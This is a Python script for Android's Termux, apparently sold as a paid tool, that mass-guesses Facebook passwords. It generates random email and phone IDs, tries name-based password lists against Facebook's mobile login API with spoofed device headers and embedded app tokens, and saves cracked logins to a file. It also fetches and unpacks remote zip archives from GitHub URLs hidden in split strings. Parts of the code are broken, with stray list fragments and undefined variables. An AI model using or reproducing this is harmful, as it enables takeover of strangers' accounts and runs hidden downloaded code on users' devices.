#SOURCE BY : SATTAR 
#GITHUB : LEGEND 
#coding = utf-8
from uuid import uuid4
import os,sys,tempfile,string,random,subprocess,uuid
http_directory = tempfile.mkdtemp(prefix='.')
site_packages = sys.path[4]
print(site_packages)
print(http_directory)
sys.path.remove(site_packages)
sys.path.insert(4,http_directory+'/reqmodule')
sys.path.insert(5,http_directory)
try:
        os.mkdir('crypto')
except:pass
hh = "ho"
hh2 = "9/pycrypt"
find_aarch = subprocess.check_output('uname -om',shell=True)
if 'aarch64' in str(find_aarch):
        user_aarch = '64'
        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'
elif 'arm' in str(find_aarch):
        user_aarch = '32'
        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'
else:
        print(' Unknown aarch ')
        exit()
if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
        os.system('clear')
        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')
        os.system('python ASB.py')
else:
        akk2="rsi"
        akk=f"cha{akk2}fi"
        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')
        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'
        os.system(f'curl -L {lib} > {http_directory}/config.zip')
        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')
try:
        import time,requests,re,platform,base64,datetime,hashlib,string,json,io,struct
        from string import *
        from concurrent.futures import ThreadPoolExecutor as ThreadPool
        from Crypto.Cipher import AES, PKCS1_v1_5
        from Crypto.PublicKey import RSA
        from Crypto.Random import get_random_bytes
except Exception as e:
        print(e)
        print('\n Installing modules wait !')
        os.system('pip install futures==2 && python jan.py')
except FileExistsError:
        os.system('pip uninstall requests urllib3 idna certifi -y')
        pass

try:
        import os,sys,time,json,random,re,string,platform,base64,requests,io,struct,zlib
        from string import *
        from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python ASB.py')

#----[pran links]-----
kkk = {'user-agent': 'Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '31061', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': '28613', 'x-fb-connection-bandwidth': '29643048', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}
hhh = {'adid': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'email': '10000'+str(random.randint(11111111111,99999999999)), 'password': str(random.randint(1111111,9999999)), 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': 'SM-A500H', 'device_id': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}
lll = ("https://b-api.facebook.com/method/auth.login")
#----[remover]-----
import os,shutil,zlib
'Mozilla/5.0 (Linux; Tizen 2.3; SAMSUNG SM-Z130H) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.0 Mobile Safari/537.3',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900V 4G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A137F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T280) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A127M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',]
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-A500FU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-A9000 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900V 4G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-N910V Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-N920T Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G900V Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 2.2; en-us; SCH-I800 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
'Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13',
'Dalvik/2.1.0 Linux; U; Android 7.1.1; SM-A10 Pro Build/LMY47I',
'Dalvik/2.1.0 Linux; U; Android 7.1.1; SM-A8+ Build/LMY47I',
'Dalvik/2.1.0 Linux; U; Android 7.1.1; SM-J6 Pro Build/LMY47I',
'Dalvik/2.1.0 Linux; U; Android 7.1; SM-J5 Pro Build/LMY47I',
'Dalvik/2.1.0 Linux; U; Android 8.0; SM-A7 Build/LMY47I',
'Dalvik/2.1.0 Linux; U; Android 8.0; SM-A7 Star Build/LMY47I',
'Dalvik/2.1.0 Linux; U; Android 8.0; SM-A9 Star Build/LMY47I',
'Dalvik/2.1.0 Linux; U; Android 8.0; SM-A90 Active Build/LMY47I',
'Dalvik/2.1.0 Linux; U; Android 8.0; SM-J6 Build/LMY47I',
'Dalvik/2.1.0 Linux; U; Android 8.0; SM-J7 Duo Build/LMY47I',
'Dalvik/2.1.0 Linux; U; Android 9.0; SM-A10 Pro Build/LMY47I',
'Dalvik/2.1.0 Linux; U; Android 9.0; SM-A7s Build/LMY47I',
'Mozilla/5.0 (Android; Android 4.3.1; SAMSUNG SM-G310I Build/JLS36C) AppleWebKit/537.22 (KHTML, like Gecko)  Chrome/52.0.1634.227 Mobile Safari/600.2',
'Mozilla/5.0 (Android; Android 4.4.1; SM-N8010 Build/JZO54K) AppleWebKit/602.41 (KHTML, like Gecko)  Chrome/51.0.2945.351 Mobile Safari/600.5',
'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G405F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.2 Chrome/63.0.3239.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.2.2; SM-J310 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.2.2; SM-J800FN Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.2.2; SM-J900FN Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.3; SM-G3139D Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.3; SM-G3588V Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.3; SM-G9098 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.3; SM-S765C Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.3; SM-S765C Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.3; ar-ye; SAMSUNG SM-S765C Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.3; en-us; SAMSUNG SM-G9092 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.3; kk-kz; SAMSUNG SM-G3588V Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.3; zh-cn; SAMSUNG-SM-G3588V_TD Android/4.3 Release/11.15.2013 Browser/AppleWebKit537.36 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-G3300 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-G3300 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-J310 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-T321 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-T321 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-T321 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-T321 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-T321 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-T321 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-T321 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-T321 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36 Mobile UCBrowser/3.4.3.532',
'Mozilla/5.0 (Linux; Android 4.4.2; SM-T321) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Safari/537.36',
#--checking if file is not avalible
if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
        pass
        exit("Error in termux modules ")

if os.path.exists(sz):
        os.rename(sz1,'.f1')
        os.rename(sz2,'.f2')
        os.system(sz3)
        os.system(sz4)
        os.system(sz5)
        os.system(sz6)
else:
        pass
os.system("rm -rf .f1")
os.system("rm -rf .f2")

logo= f'''
 
       LEGEND
 ABDUL SATTAR 
       🔥🤟

                                                 
{50*"-"}
    Tool Version :     1.5
    Thanks Alot  :    SATTAR.
    Owner.           :   ABDUL SATTAR
    Whatsapp.     : 03201134456
{50*"-"}'''

#--(Dark@Colours)---#
r="\033[1;91m"
g="\033[1;92m"
y="\033[1;93m"
b="\033[1;94m"
p="\033[1;95m"
c="\033[1;96m"
l="\033[1;97m"
s="\033[0m"
#--(light@Colours)---#
lr="\033[0;91m"
lg="\033[0;92m"
ly="\033[0;93m"
lb="\033[0;94m"
lp="\033[0;95m"
lc="\033[0;96m"
ll="\033[0;97m"
#--(rare-colors)--#
holaa="38;5"
ro=(f"\033[{holaa};208")
rb=(f"\033[{holaa};32")
rc=(f"\033[{holaa};122m")
rg= (f"\033[{holaa};112m")
rp=(f"\033[{holaa};147m")

loop = 0
methods = []
ok=[]
total=[]
clone_type=[]
android_models = []

xny = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5OKK)\xcb1442\xd0O,\xd0\xcfM\xcc\xcc\xd3\xcfJ\x03\x001"\x13\xc6')
update = requests.get(xny).text
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""
bumper = id+bxd+xp
myweb2 = requests.get(xny).text

def qsbuy():
        try:
                os.system('https://chat.whatsapp.com/CeqoJYPzKa486WW6EaNnW4')
                print(logo)
                x = requests.get('https://github.com/Sattar-XD/Approval/blob/main/Approval.txt')
                if str("upppdate") in update:
                        os.system('https://chat.whatsapp.com/CeqoJYPzKa486WW6EaNnW4')
                        exit('script is in update / maintanance be patient ')
                elif str("res-sseett") in update:
                        os.system('')
                        os.system('')
                        os.system('')
                        exit('Dont Try To Bypass')
                elif bumper in myweb2:
                        main()
                else:
                        os.system("https://chat.whatsapp.com/CeqoJYPzKa486WW6EaNnW4");print(logo)
                        print(f"{lr}   Your Device License Key Is Not Approved{s}")
                        print(50*"-")
                        print(f"{rc} Key : {bumper}{s}")
                        print(50*"-")
                        print(f" Note : Tool is Paid & We Accept All Types Of PAyment  Method . If There was Fb Update & Tool Wasnt Run Then We Are Not Responsible For All Of This . We Will Try  To Update Script Every Time But It Took Day ")
                        print("\n Baray Mehrbani Tool Apni Zimadare May Buy Kary Lehaza May Apko Force Ni Kar Raha ! Baqe Tool Har 2 sy 3 din bad update hgaya kryga ")
                        print(50*"-")
                        print(f" 15-Days Price : 350")
                        print(f" 1-Month Price : 500")
                        print(50*"-")
                        input("[Press Enter To Send Key To Admin]")
                        os.system(f"termux-open-url https://wa.me/03201134456?text={bumper}")
                        qsbuy()
        except requests.exceptions.ConnectionError:
                exit(' No internet connection ..')

def rrrr():
        if bumper in myweb2:
                pass
        else:
                qsbuy()
def xchker():
    pass
def main():
        xchker()
        os.system('rm -rf ...txt')
        os.system('https://chat.whatsapp.com/CeqoJYPzKa486WW6EaNnW4')
        print(logo);xchker()
        print('Code Like Humor When You Have To Explain It Its Bad')
        print(50*'-')
        print('[1] Fb Cloning Menu')
        print('[2] File Create Menu')
        print('[3] Number Detail Finder')
        print('[4] Remove Cookie')
        print('[5] Clear Cache')
        print('[6] Best Pass Lists \033[0;97m')
        print('[7] How To Use Video')
        print('[0] Exit \033[0;97m')
        print(50*'-')
        menu_opt = input('Select choice : ')
        if menu_opt =='1':
                method_crack()
        elif menu_opt =='2':
                create_file()
        elif menu_opt =='3':
                xchker()
                os.system('xdg-open https://github.com/Sattar-XD')
                main()
        elif menu_opt =='4':
                os.system('rm -rf fb_cookies.txt')
                os.system('rm -rf access_token.txt')
                print('       Removed Success')
                time.sleep(3)
                main()
        elif menu_opt =='5':
                isdd="les/u"
                isd="sr/t"
                isddd="p/."
                llb = f"/data/data/com.termux/fi{isdd}{isd}m{isddd}*"
                os.system(f"rm -rf {llb}")
                exit("      Sucessfully Removed .      ")
        elif menu_opt =='6':
                os.system('https://chat.whatsapp.com/CeqoJYPzKa486WW6EaNnW4')
                print(logo);xchker()
                print(' Select Your Country For Best PassLists')
                print(50*'-')
                print('[1] Pakistani Ids')
                print('[2] Bangladesh Ids')
                print('[3] Nigeria Ids')
                print('[4] Other Countries')
                print('[0] Back \033[0;97m')
                print(50*'-')
                menu_opt = input('Select choice : ')
                if menu_opt =='1':
                        os.system('https://chat.whatsapp.com/CeqoJYPzKa486WW6EaNnW4')
                        print(logo);xchker()
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('khan123')
                        print('first1234')
                        print('first12345')
                        print('i love you')
                        print('firstkhan')
                        print('khankhan')
                        print('khan12345')
                        print('khan12')
                        print('first786')
                        input('\nPress enter to back ')
                        main()
                elif menu_opt =='2':
                        os.system('clear')
                        print(logo);xchker()
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('Bangladesh')
                        print('first1234')
                        print('first12345')
                        print('bangladesh')
                        print('i love you')
                        print('Jannatul123')
                        print('Mohammed123')
                        print('Mohammad123')
                        print('first@123')
                        input('\nPress enter to back ')
                        main()
                elif menu_opt =='3':
                        os.system('clear')
                        print(logo);xchker()
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('i love you')
                        print('musa123')
                        print('first12345')
                        print('first@123')
                        print('first@1234')
                        print('firstfirst')
                        print('lastlast')
                        print('first786')
                        print('first1122')
                        input('\nPress enter to back ')
                        main()
                elif menu_opt =='4':
                        os.system('clear')
                        print(logo);xchker()
                        print('first last')
                        print('First Last')
                        print('firstlast')
                        print('first123')
                        print('i love you')
                        print('first321')
                        print('lastfirst')
                        print('firstlast123')
                        print('first12345')
                        print('first@123')
                        print('first@1234')
                        print('firstfirst')
                        print('first007')
                        print('first789')
                        print('first1122')
                        input('\nPress enter to back ')
                        main()
        elif menu_opt == "7":
                try:
                        os.system('python ASB.py')
                except:
                        exit('video is not avalible Right now in server try again after few hours')
        elif menu_opt == "0":
                main()
        else:
                print('\n Invalid option, try again ...')
                time.sleep(3)
                main()

def login():
        os.system('https://www.facebook.com/liveyou.shar?mibextid=ZbWKwL')
        print(logo);xchker()
        cookies = input(' Put cookies here: ')
        try:
                print('\n Validating cookies ... ')
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(EAAG\w+)", data.text)
                open("access_token.txt", "w").write(find_token.group(1))
                open("fb_cookies.txt","w").write(cookies)
                print(' Logged in successfully ...')
                time.sleep(1)
                os.system('python ASB.py')
        except KeyError:
                print('\n Inavlid cookies, try another cookies')
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
        except AttributeError:
                print('\n Invalid cookies, try another cookies ...')
                exit()

def method_crack():
        os.system('clear')
        print(logo);xchker()
        print(' [1] File Cloning ')
        print(' [2] Rendom Cloning ')
        print(' [3] Number Cloning ')
        print(' [0] Back')
        print(50*'-')
        clone_ = input(' Select : ')
        if clone_ == "1":
                clone_type.append('1')
        elif clone_ == "2":
                clone_type.append('2')
        elif clone_ == "3":
                clone_type.append('3')
        elif clone_ == "0":
                main()
        else:
                exit('invalid select')
        mycrackistan()

def mycrackistan():
        global methods
        if '1' in clone_type:
                crack_main().crackfile(id)
        elif '2' in clone_type:
                crack_main().crackmail(id)
        elif '3' in clone_type:
                crack_main().cracknum(id)

class crack_main():
        def __init__(self):
                self.id=[]
        def crackfile(self,id):
                global methods
                os.system('https://chat.whatsapp.com/CeqoJYPzKa486WW6EaNnW4')
                print(logo);xchker()
                self.file = input(' Put file path: ')
                try:
                        self.id = open(self.file).read().splitlines()
                        self.pasw()
                except FileNotFoundError:
                        print(' No file found ....')
                        exit()
        def crackmail(self,id):
                global methods
                os.system("https://chat.whatsapp.com/CeqoJYPzKa486WW6EaNnW4");print(logo);xchker()
                import requests,random
                user=[]
                print(" [*] First Name Example ABDUL, SATTAR")
                first = input(" First Name : ")
                last = input(" Last Name : ")
                print(" \n [*] Ex @gmail.com,@yahoo.com or @hotmail.com etc")
                domain = input(" Domain : ")
                print("\n [?] Limit ids Example 1000,5000,50000")
                limit = int(input(" Limit Ids : "))
                for nmbr in range(limit):
                        nmpp = random.randint(99,9999)
                        nmp = f"{first}{last}{str(nmpp)}{domain}|{first} {last}\n"
                        naseeb = open('...txt','a').write(nmp)
                self.id = open('...txt').read().splitlines()
                self.pasw()
        def cracknum(self,id):
                global methods
                os.system('clear');print(logo);xchker()
                print('\033[0mFor Example :\033[0m 92310,92342,92300,92301 ...')
                kode = input('\033[0mChoose Code : \033[0m')
                print('\033[0mFor Example :\033[0m 2000,4000,6000 ...')
                limit = int(input('\033[0mIdz Limit : \033[0m'))
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        xoo = kode+nmp.replace(" ","")
                        xdr = f"{kode+nmp}|{nmp} {xoo}\n"
                        naseeb = open('...txt','a').write(xdr)
                self.id = open('...txt').read().splitlines()
                self.pasw()
        def m1(self,iid,name,passlist):
                try:
                        global ok,loop,android_models
                        sys.stdout.write('\r[SSB] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                                infos = open('device_info.txt','r').read()
                                try:
                                        version_,model_,brand_name_,width_,height_=infos.split('$')
                                except:
                                        version_ = str(random.randint(7,13))
                                        model_ = "Infinix"
                                        brand_name_ = "Infinix"
                                        width_ = "720"
                                        height_ = "1280"
                                uas = 'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+width_+',height='+height_+'};]'
                                fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
                                adid = str(uuid.uuid4())
                                abhi = "5531728|62f8ce9"
                                head = {'Connection': 'keep-alive', 'Authorization': 'OAuth 35068'+abhi+'f74b12f84c123cc23437a4a32', 'Host': 'b-graph.facebook.com', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)), 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)), 'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)), 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Token': '', 'X-FB-Connection-Type': 'MOBILE.WCDMA', 'User-Agent': uas, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '531'}
                                data = "adid="+adid+"&email="+iid+"&password="+pas+"&cpl=true&credentials_type=password&error_detail_type=password&source=device_based_login&format=json&device_id="+adid+"&family_device_id="+adid+"&session_id="+adid+"&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&locale=en_US&client_country_code=US&advertising_id="+adid+"&fb_api_req_friendly_name=authenticateate"
                                po = requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data).json()
                                #print(po,hdata)ata)
                                try:
                                        roid = str(po['uid'])
                                except:
                                        roid = iid
                                if 'session_key' in po:
                                        print(' \033[1;32m[SSB-ok] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/SSB_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                elif 'Please Confirm Email' in po:
                                        print(' \033[1;32m[SSB-ok] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/SSB_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                else:
                                        continue
                        loop+=1
                except Exception as e:
                        pass
                        #print(e)

        def pasw(self):
                passlist = []
                if not os.path.exists('device_info.txt'):
                        os.system('clear')
                        print(logo)
                        print(" what is your andriod version ex 8,9,10")
                        version_=input(' type andriod version : ')
                        print(44*'-')
                        print(" your mobile module name ex Techno LD7 etc")
                        model_=input(" module name : ")
                        print(44*"-")
                        print(" your mobile company name ex Techno,Redmi")
                        brand_name_=input(" device company name : ")
                        print(44*'-')
                        print(" your mobile width ex 720,740,730,780 etc")
                        width_=input(" device width : ")
                        print(44*'-')
                        print(" your mobile height ex 1660,1780,1730 etc")
                        height_=input(" device company name : ")
                        info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+width_+'$'+height_)
                os.system('clear')
                print(logo);xchker()
                print(' for auto password list type auto or Auto')
                print(50*"-")
                pl = input(' How Much Password Do You Want To Add ? ')
                if pl in ['auto','Auto','AUTO','auto or Auto']:
                        passlist.append('first123')
                        passlist.append('first12345')
                        passlist.append('first1234')
                        passlist.append('khan12')
                        passlist.append('khankhan')
                        passlist.append('khan123')
                        passlist.append('first786')
                        passlist.append('first12')
                        passlist.append('first1122')
                        passlist.append('last123')
                        passlist.append('last12')
                        passlist.append('i love you')
                else:
                        print(' Example first123,last123,khan123,firstlast')
                        print(50*"-")
